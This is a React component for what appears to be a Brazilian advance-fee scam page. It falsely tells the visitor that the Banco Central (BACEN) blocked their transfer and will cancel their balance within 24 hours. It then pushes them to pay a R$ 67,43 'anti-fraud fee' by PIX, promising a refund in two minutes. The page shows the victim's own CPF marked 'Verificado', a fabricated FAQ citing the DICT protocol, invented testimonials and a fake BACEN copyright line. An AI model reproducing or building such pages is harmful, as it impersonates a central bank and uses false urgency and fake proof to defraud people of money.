import { useState } from "react";
import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
import pixLogo from "@/assets/pix-logo.svg";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";
import FunnelSecurityBadge from "./FunnelSecurityBadge";
import FunnelActiveUsersCounter from "./FunnelActiveUsersCounter";

interface FunnelUpsellAntiFraudeProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }

const TestimonialCard = ({ avatar, name, location, time, text, amount }: { avatar: string; name: string; location: string; time: string; text: string; amount: string }) => (
  <div className="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
    <div className="flex items-center gap-2 mb-2"><img src={avatar} alt={name} className="w-8 h-8 rounded-full object-cover" loading="lazy" /><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location} • {time}</p></div><span className="text-[#00A651] text-[10px] font-bold bg-green-50 px-2 py-0.5 rounded-full">+{amount}</span></div>
    <p className="text-gray-600 text-[11px] leading-relaxed">"{text}"</p>
    <div className="flex gap-0.5 mt-1.5">{[...Array(5)].map((_, i) => <span key={i} className="text-yellow-400 text-[10px]">★</span>)}</div>
  </div>
);

const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
  const [open, setOpen] = useState(false);
  return (
    <div className="bg-white rounded-xl shadow-sm border border-gray-50 overflow-hidden">
      <button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>
      {open && <div className="px-3 pb-3"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}
    </div>
  );
};

const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiFraudeProps) => {
  return (
    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
      <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">⚠️ TRANSFERÊNCIA BLOQUEADA PELO BACEN</h1></div>
      <main className="px-3 py-4 max-w-lg mx-auto">
        {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-red-50 border border-red-300 rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⛔</span><div><p className="text-red-700 text-xs font-bold mb-1">SALDO SERÁ CANCELADO EM 24H</p><p className="text-red-600 text-[11px] leading-relaxed">O <span className="font-bold">Banco Central</span> bloqueou sua transferência de <span className="font-bold">{balance}</span> por suspeita de fraude.</p></div></div></div>
        <div className="bg-green-50 rounded-xl p-4 mb-3 border border-green-200"><p className="text-green-700 text-xs font-bold mb-2">✅ Com a verificação anti-fraude:</p><div className="space-y-1.5"><p className="text-green-700 text-[11px]">✓ Saldo de <strong>{balance} liberado em até 3 minutos</strong></p><p className="text-green-700 text-[11px]">✓ Taxa de R$ 67,43 <strong>reembolsada em 2 min</strong></p></div></div>
        <div className="bg-white rounded-xl p-5 shadow-sm">
          <div className="flex justify-center mb-3"><div className="w-14 h-14"><img src={pixLogo} alt="PIX" className="w-full h-full object-contain" /></div></div>
          <div className="bg-gray-50 rounded-lg p-3 mb-2 border border-gray-100"><div className="flex justify-between items-center mb-1"><span className="text-gray-500 text-[11px]">Tarifa anti-fraude:</span><span className="text-gray-900 text-sm font-bold">R$ 67,43</span></div><div className="flex justify-between items-center"><span className="text-gray-500 text-[11px]">Reembolso:</span><span className="text-[#00A651] text-[11px] font-semibold">Automático em até 2 min</span></div></div>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-full bg-[#00A651] text-white font-bold text-sm hover:brightness-105 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-green-200" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>{isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : 'LIBERAR MEU SALDO AGORA →'}</button>
          <FunnelSecurityBadge />
        </div>
        <FunnelActiveUsersCounter />
        <div className="mt-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Por que preciso pagar essa tarifa?" answer="Protocolo DICT do Banco Central exige verificação anti-fraude para movimentações acima de R$ 2.000." /><FaqItem question="Vou receber o reembolso?" answer="Sim, 100% garantido. Retorna em até 2 minutos. Risco zero." /><FaqItem question="Quanto tempo para receber?" answer="Após pagamento, liberação em menos de 3 minutos." /></div></div>
        <div className="mt-3 space-y-2.5"><p className="text-gray-600 text-xs font-bold text-center">Quem já recebeu:</p><TestimonialCard avatar={testimonial1} name="Mariana S." location="São Paulo, SP" time="há 12 min" text="Paguei a tarifa e em menos de 2 minutos o PIX caiu na minha conta." amount="R$ 3.241,00" /><TestimonialCard avatar={testimonial2} name="Carlos A." location="Belo Horizonte, MG" time="há 38 min" text="Paguei e recebi meu saldo inteiro rapidinho." amount="R$ 2.876,50" /><TestimonialCard avatar={testimonial3} name="Fernanda L." location="Rio de Janeiro, RJ" time="há 1h" text="A tarifa voltou certinho e meu saldo caiu rapidinho." amount="R$ 2.654,30" /></div>
        <p className="text-gray-400 text-[10px] text-center mt-4 pb-6">© 2025 Protocolo DICT/BACEN</p>
      </main>
      <style>{`@keyframes ctaPulse { 0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(0,166,81,0.3); } 50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(0,166,81,0.5); } }`}</style>
    </div>
  );
};

export default FunnelUpsellAntiFraude;
